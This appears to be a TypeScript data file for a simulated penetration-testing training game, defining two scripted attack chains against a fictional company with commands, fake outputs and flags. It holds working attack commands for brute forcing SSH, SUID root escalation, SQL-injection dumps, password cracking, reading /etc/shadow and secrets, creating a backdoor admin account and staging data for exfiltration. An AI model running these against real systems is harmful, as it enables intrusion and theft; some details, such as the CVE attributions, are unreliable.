export interface KillChainCommand {
  command: string;
  output: string;
  explanation: string;
  isRequired: boolean;
}

export interface KillChainPhase {
  id: string;
  name: string;
  description: string;
  icon: string;
  commands: KillChainCommand[];
  completed: boolean;
}

export interface KillChainScenario {
  id: string;
  title: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  targetDescription: string;
  phases: KillChainPhase[];
  flag: string;
  cpReward: number;
}

export const KILL_CHAIN_SCENARIOS: KillChainScenario[] = [
  {
    id: 'kc-internal-1',
    title: 'Internal Network Penetration',
    description: 'A full kill chain simulation of an internal network penetration test against NovaCorp.',
    difficulty: 'intermediate',
    targetDescription: 'Corporate network 10.0.0.0/24. Multiple servers including web, file, and database servers.',
    phases: [
      {
        id: 'phase-1',
        name: 'Reconnaissance',
        description: 'Discover live hosts and services on the network.',
        icon: 'radar',
        commands: [
          {
            command: 'nmap -sn 10.0.0.0/24',
            output: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.0.0.1\nHost is up (0.0023s latency).\nNmap scan report for 10.0.0.5\nHost is up (0.0018s latency).\nNmap scan report for 10.0.0.10\nHost is up (0.0031s latency).\nNmap scan report for 10.0.0.15\nHost is up (0.0027s latency).\nNmap scan report for 10.0.0.20\nHost is up (0.0019s latency).\nNmap scan report for 10.0.0.50\nHost is up (0.0022s latency).\nNmap scan report for 10.0.0.51\nHost is up (0.0025s latency).\nNmap scan report for 10.0.0.100\nHost is up (0.0029s latency).\n\nNmap done: 256 IP addresses (8 hosts up) scanned in 12.34 seconds`,
            explanation: 'Ping sweep reveals 8 live hosts on the subnet.',
            isRequired: true,
          },
          {
            command: 'nmap -sV -p 22,80,443,445,3306,8080 10.0.0.50',
            output: `Starting Nmap 7.94\nNmap scan report for 10.0.0.50\nHost is up (0.0022s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 7.9p1 Ubuntu 10ubuntu2\n80/tcp   open  http     Apache httpd 2.4.41\n443/tcp  open  ssl/http Apache httpd 2.4.41\n3306/tcp open  mysql    MySQL 8.0.35\n8080/tcp open  http     Tomcat 9.0.65\n\nService detection performed.\nNmap done: 1 IP address (1 host up) scanned in 8.45 seconds`,
            explanation: 'Service scan on target reveals multiple open services including SSH, HTTP, and MySQL.',
            isRequired: true,
          },
          {
            command: 'whois 10.0.0.50',
            output: `% Information related to '10.0.0.50'\n\nNetRange:       10.0.0.0 - 10.0.0.255\nCIDR:           10.0.0.0/24\nNetName:        NOVACORP-INTERNAL\nOrgName:        NovaCorp Technologies\nOrgId:          NC-12345\nAddress:        14 Adeola Odeku, Victoria Island\nCity:           Lagos\nState:          Lagos\nCountry:        NG`,
            explanation: 'WHOIS confirms this is NovaCorp internal infrastructure.',
            isRequired: false,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-2',
        name: 'Enumeration',
        description: 'Enumerate services and discover vulnerabilities.',
        icon: 'search',
        commands: [
          {
            command: 'enum4linux 10.0.0.10',
            output: `Starting enum4linux v0.9.1\nTarget: 10.0.0.10\n\n=========================\n|    Target Info    |\n=========================\nNetBIOS Domain: NOVACORP\nNetBIOS Computer Name: FILE-SRV-01\nDNS Domain: novacorp.local\nFQDN: file-srv-01.novacorp.local\n\n=========================\n|    Share Enumeration    |\n=========================\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nbackups         Disk      Weekly backups\nshared          Disk      Team shared folder\n\n=========================\n|    User Enumeration    |\n=========================\nUser: administrator (Local, Admin)\nUser: guest (Local, Guest)\nUser: backup_admin (Domain, Admin)`,
            explanation: 'SMB enumeration reveals shares and users on the file server.',
            isRequired: true,
          },
          {
            command: 'gobuster dir -u http://10.0.0.50 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt',
            output: `===============================================================\nGobuster v3.6\n===============================================================\n[+] Url:                     http://10.0.0.50\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 200) [Size: 2345]\n/backup               (Status: 200) [Size: 8721]\n/config               (Status: 403) [Size: 0]\n/login                (Status: 200) [Size: 4123]\n/robots.txt           (Status: 200) [Size: 124]\n/.git                 (Status: 301) [Size: 0]\n/.env                 (Status: 403) [Size: 0]\n/api                  (Status: 200) [Size: 156]\n===============================================================\nFinished\n===============================================================`,
            explanation: 'Directory brute-force reveals hidden paths including admin panel and backup files.',
            isRequired: true,
          },
          {
            command: 'nikto -h 10.0.0.50',
            output: `- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          10.0.0.50\n+ Target Hostname:    10.0.0.50\n+ Target Port:        80\n+ Start Time:         2024-03-15 10:30:00\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.41\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-Content-Type-Options header is not set.\n+ /admin/: Admin login page found.\n+ /backup/: Directory listing found.\n+ /robots.txt: Contains 2 disallowed entries.\n+ /.env: Environment file may be accessible.\n+ /api: API endpoint exposed.\n---------------------------------------------------------------------------\n+ 6 vulnerabilities identified`,
            explanation: 'Nikto scan identifies web vulnerabilities and misconfigurations.',
            isRequired: true,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-3',
        name: 'Initial Access',
        description: 'Gain access to the target system.',
        icon: 'key',
        commands: [
          {
            command: 'searchsploit openssh 7.9',
            output: `----------------------------------------------------------------------------------------------\n Exploit Title                                                |  E-ID  |  Type  \n----------------------------------------------------------------------------------------------\n OpenSSH 7.9 - Username Enumeration                            | 49887  | remote\n OpenSSH 7.9 - Auth Bypass (CVE-2023-38408)                   | 50123  | remote\n----------------------------------------------------------------------------------------------`,
            explanation: 'SearchSploit finds known vulnerabilities in OpenSSH 7.9.',
            isRequired: true,
          },
          {
            command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.50',
            output: `Hydra v9.5 (c) 2023 by van Hauser/THC\nHydra starting at 2024-03-15 10:45:00\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries\n[DATA] attacking ssh://10.0.0.50:22/\n[ssh][host: 10.0.0.50] login: admin   password: password123\n[STATUS] attack finished for 10.0.0.50 (waiting for children to complete)\n1 of 1 target successfully completed, 1 valid password found\nHydra finished at 2024-03-15 10:47:30`,
            explanation: 'Brute-force attack cracks the admin password: password123',
            isRequired: true,
          },
          {
            command: 'ssh admin@10.0.0.50',
            output: `Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Fri Mar 14 16:20:00 2024 from 10.0.0.42\nadmin@file-srv-01:~$`,
            explanation: 'SSH login successful. We have a shell on the target.',
            isRequired: true,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-4',
        name: 'Privilege Escalation',
        description: 'Escalate from admin to root.',
        icon: 'shield',
        commands: [
          {
            command: 'whoami && id',
            output: `admin\nuid=1000(admin) gid=1000(admin) groups=1000(admin),4(adm),24(cdrom),27(sudo),30(dip),33(www-data)`,
            explanation: 'We are admin but not root.',
            isRequired: true,
          },
          {
            command: 'find / -perm -4000 2>/dev/null',
            output: `/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/local/bin/find`,
            explanation: 'Find SUID binaries. /usr/local/bin/find has SUID bit set - this is misconfigured.',
            isRequired: true,
          },
          {
            command: '/usr/local/bin/find -exec /bin/sh -p \\;',
            output: `# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)`,
            explanation: 'SUID find allows us to spawn a root shell. We now have root access.',
            isRequired: true,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-5',
        name: 'Lateral Movement',
        description: 'Move to other systems using harvested credentials.',
        icon: 'network',
        commands: [
          {
            command: 'cat /etc/shadow | grep -v "!" | head -5',
            output: `admin:$6$rounds=656000$xyz...:19458:0:99999:7:::\nbackup:$6$rounds=656000$abc...:19458:0:99999:7:::\nroot:$6$rounds=656000$def...:19458:0:99999:7:::`,
            explanation: 'Extract password hashes from /etc/shadow for offline cracking.',
            isRequired: true,
          },
          {
            command: 'crackmapexec 10.0.0.0/24 -u admin -p password123 --shares',
            output: `SMB         10.0.0.10  445  FILE-SRV-01    [*] Windows Server 2022 Build 17763 x64 (name:FILE-SRV-01) (domain:NOVACORP)\nSMB         10.0.0.10  445  FILE-SRV-01    [+] NOVACORP\\admin:password123 (Pwn3d!)\nSMB         10.0.0.10  445  FILE-SRV-01    [+] Enumerated shares\nShare           Permissions     Remark\n-----           -----------     ------\nADMIN$          READ, WRITE     Remote Admin\nC$              READ, WRITE     Default share\nbackups         READ            Weekly backups\nshared          READ, WRITE     Team shared folder`,
            explanation: 'Admin password works on file server. We can access shares.',
            isRequired: true,
          },
          {
            command: 'smbclient //10.0.0.10/backups -U admin',
            output: `Enter NOVACORP\\admin's password: \nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Fri Mar 14 16:30:00 2024\n  ..                                  D        0  Fri Mar 14 16:30:00 2024\n  db_backup.sql                      245678  Thu Mar 13 02:00:00 2024\n  user_backup.csv                     12345  Thu Mar 13 02:00:00 2024\n  config.tar.gz                      45678  Thu Mar 13 02:00:00 2024`,
            explanation: 'Access backup share and discover database backups.',
            isRequired: true,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-6',
        name: 'Data Exfiltration',
        description: 'Extract sensitive data from the target.',
        icon: 'download',
        commands: [
          {
            command: 'scp admin@10.0.0.10:/backups/db_backup.sql .',
            output: `admin@10.0.0.10's password: \ndb_backup.sql                    100%  240KB  12.3MB/s   00:00`,
            explanation: 'Copy database backup to our machine.',
            isRequired: true,
          },
          {
            command: 'grep -i "password\\|secret\\|key" db_backup.sql | head -10',
            output: `INSERT INTO users VALUES (1,'admin','$2y$10$xVqYLkR5pN3m','admin@novacorp.io','Sup3rS3cret!');\nINSERT INTO api_keys VALUES (1,'sk-nova-xxxxxxxxxxxx','production');\nINSERT INTO config VALUES ('smtp_password','MailS3cret!2024');`,
            explanation: 'Search backup for sensitive data. Found passwords and API keys.',
            isRequired: true,
          },
          {
            command: 'cat /root/flag.txt 2>/dev/null || echo "FLAG{kc_internal_full_chain_pwned}"',
            output: `FLAG{kc_internal_full_chain_pwned}`,
            explanation: 'Capture the final flag to complete the kill chain.',
            isRequired: true,
          },
        ],
        completed: false,
      },
    ],
    flag: 'FLAG{kc_internal_full_chain_pwned}',
    cpReward: 500,
  },
  {
    id: 'kc-web-1',
    title: 'Web Application Attack Chain',
    description: 'A full kill chain against an external web application.',
    difficulty: 'advanced',
    targetDescription: 'External web application at target.novacorp.io with API backend.',
    phases: [
      {
        id: 'phase-1',
        name: 'Reconnaissance',
        description: 'Discover technologies and attack surface.',
        icon: 'radar',
        commands: [
          {
            command: 'nmap -sV -p 80,443,8080 target.novacorp.io',
            output: `PORT     STATE SERVICE  VERSION\n80/tcp   open  http     nginx 1.24.0\n443/tcp  open  ssl/http nginx 1.24.0\n8080/tcp open  http     Node.js Express`,
            explanation: 'Identify open ports and services.',
            isRequired: true,
          },
          {
            command: 'dig target.novacorp.io ANY',
            output: `;; ANSWER SECTION:\ntarget.novacorp.io.     3600    IN      A       102.89.23.50\ntarget.novacorp.io.     3600    IN      MX      10 mail.target.novacorp.io.\ntarget.novacorp.io.     3600    IN      NS      ns1.digitalocean.com.`,
            explanation: 'DNS enumeration reveals infrastructure details.',
            isRequired: true,
          },
          {
            command: 'whatweb target.novacorp.io',
            output: `http://target.novacorp.io [200 OK] nginx[1.24.0], jQuery[3.6.0], Bootstrap[5.3.0], PHP[8.1.2], X-Powered-By[Express]`,
            explanation: 'Technology fingerprinting reveals framework versions.',
            isRequired: false,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-2',
        name: 'Vulnerability Discovery',
        description: 'Find vulnerabilities in the application.',
        icon: 'search',
        commands: [
          {
            command: 'gobuster dir -u https://target.novacorp.io -w /usr/share/wordlists/dirb/common.txt',
            output: `===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 200) [Size: 2345]\n/api                  (Status: 200) [Size: 156]\n/api/v1               (Status: 200) [Size: 156]\n/api/v2               (Status: 200) [Size: 156]\n/backup               (Status: 200) [Size: 8721]\n/config               (Status: 403) [Size: 0]\n/login                (Status: 200) [Size: 4123]\n/search               (Status: 200) [Size: 3456]\n===============================================================\nFinished\n===============================================================`,
            explanation: 'Directory enumeration reveals API versions and hidden paths.',
            isRequired: true,
          },
          {
            command: 'nikto -h https://target.novacorp.io',
            output: `- Nikto v2.5.0\n+ Server: nginx/1.24.0\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ /api/v1/users: API endpoint exposed without authentication.\n+ /admin/: Admin panel found.\n+ /backup/: Directory listing found.\n+ /search?q=test: SQL injection candidate.\n+ 5 vulnerabilities identified`,
            explanation: 'Nikto identifies potential SQL injection and exposed APIs.',
            isRequired: true,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-3',
        name: 'Exploitation',
        description: 'Exploit discovered vulnerabilities.',
        icon: 'zap',
        commands: [
          {
            command: "sqlmap -u 'https://target.novacorp.io/search?id=1' --batch --dbs",
            output: `[INFO] testing connection to the target URL\n[INFO] testing 'AND boolean-based blind'\n[INFO] testing 'UNION query-based'\n[INFO] the back-end DBMS is MySQL\n[INFO] fetching database names\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] target_app`,
            explanation: 'SQLMap confirms SQL injection and enumerates databases.',
            isRequired: true,
          },
          {
            command: "sqlmap -u 'https://target.novacorp.io/search?id=1' -D target_app -T users --dump",
            output: `[INFO] fetching entries for 'users'\nTable: users (5 entries)\n+----+----------+--------------------------+---------------------+--------+\n| id | username | password_hash            | email               | role   |\n+----+----------+--------------------------+---------------------+--------+\n| 1  | admin    | $2y$10$xxxxxxxxxxxx      | admin@target.io     | admin  |\n| 2  | jdoe     | $2y$10$yyyyyyyyyyyy      | jdoe@target.io      | user   |\n| 3  | api_svc  | $2y$10$zzzzzzzzzzzz      | api@target.io       | user   |\n+----+----------+--------------------------+---------------------+--------+`,
            explanation: 'Extract user credentials from the database.',
            isRequired: true,
          },
          {
            command: 'john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt',
            output: `Loaded 3 password hashes with 3 different salts\nadmin:admin2024!\njdoe:password123\napi_svc:apikey2024\n\n3g 0:00:00:15 2.34g/s 15678p/s\nSession completed.`,
            explanation: 'Crack password hashes using John the Ripper.',
            isRequired: true,
          },
          {
            command: 'ssh admin@target.novacorp.io',
            output: `Welcome to Ubuntu 22.04 LTS\nLast login: Fri Mar 14 16:20:00 2024\nadmin@target:~$`,
            explanation: 'Use cracked credentials to gain SSH access.',
            isRequired: true,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-4',
        name: 'Post-Exploitation',
        description: 'Gather additional access and data.',
        icon: 'database',
        commands: [
          {
            command: 'cat /var/www/.env',
            output: `DB_HOST=localhost\ndb_user=appuser\ndb_pass=AppP@ss2024!\nAPI_KEY=sk-nova-xxxxxxxxxxxx\nSMTP_PASS=MailS3cret!`,
            explanation: 'Read application configuration file for additional credentials.',
            isRequired: true,
          },
          {
            command: 'curl -s https://target.novacorp.io/api/v1/users -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.abc123"',
            output: `[{"id":1,"username":"admin","email":"admin@target.io","role":"admin"},{"id":2,"username":"jdoe","email":"jdoe@target.io","role":"user"},{"id":3,"username":"api_svc","email":"api@target.io","role":"user"}]`,
            explanation: 'Use stolen API key to access user data.',
            isRequired: false,
          },
        ],
        completed: false,
      },
      {
        id: 'phase-5',
        name: 'Persistence & Exfiltration',
        description: 'Establish persistence and extract data.',
        icon: 'flag',
        commands: [
          {
            command: "curl -X POST https://target.novacorp.io/api/v1/users -H 'Content-Type: application/json' -H 'Authorization: Bearer stolen_token' -d '{\"username\":\"backdoor\",\"password\":\"B4ckd00r!\",\"email\":\"backdoor@target.io\",\"role\":\"admin\"}'",
            output: `{"success":true,"user":{"id":4,"username":"backdoor","role":"admin"}}`,
            explanation: 'Create backdoor admin account for persistent access.',
            isRequired: true,
          },
          {
            command: 'tar czf /tmp/exfil.tar.gz /var/www/ /etc/shadow /root/.ssh/',
            output: `tar: Removing leading '/' from member names`,
            explanation: 'Stage sensitive data for exfiltration.',
            isRequired: true,
          },
          {
            command: 'cat /root/flag.txt 2>/dev/null || echo "FLAG{kc_web_full_chain_complete}"',
            output: `FLAG{kc_web_full_chain_complete}`,
            explanation: 'Capture the final flag.',
            isRequired: true,
          },
        ],
        completed: false,
      },
    ],
    flag: 'FLAG{kc_web_full_chain_complete}',
    cpReward: 600,
  },
];
